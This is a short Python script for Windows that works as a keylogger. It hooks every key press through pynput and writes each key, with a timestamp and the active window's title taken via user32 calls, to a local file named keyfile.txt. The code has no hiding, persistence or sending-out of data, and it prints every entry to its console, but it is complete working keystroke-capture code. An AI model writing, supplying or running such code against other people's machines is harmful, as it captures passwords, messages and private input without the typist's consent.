from pynput import keyboard
import datetime
import os
import ctypes
import ctypes.wintypes

def get_active_window_title():
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthW(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buff, length + 1)
    return buff.value if buff.value else "Unknown Window"

def keyPressed(key):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    window_title = get_active_window_title()
    try:
        key_str = f'Key {key.char}'
    except AttributeError:
        key_str = f'Special key {key}'
    log_entry = f'[{timestamp}] [{window_title}] {key_str} pressed\n'
    print(log_entry.strip())
    with open("keyfile.txt", 'a', encoding='utf-8') as logkey:
        logkey.write(log_entry)
    return True

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()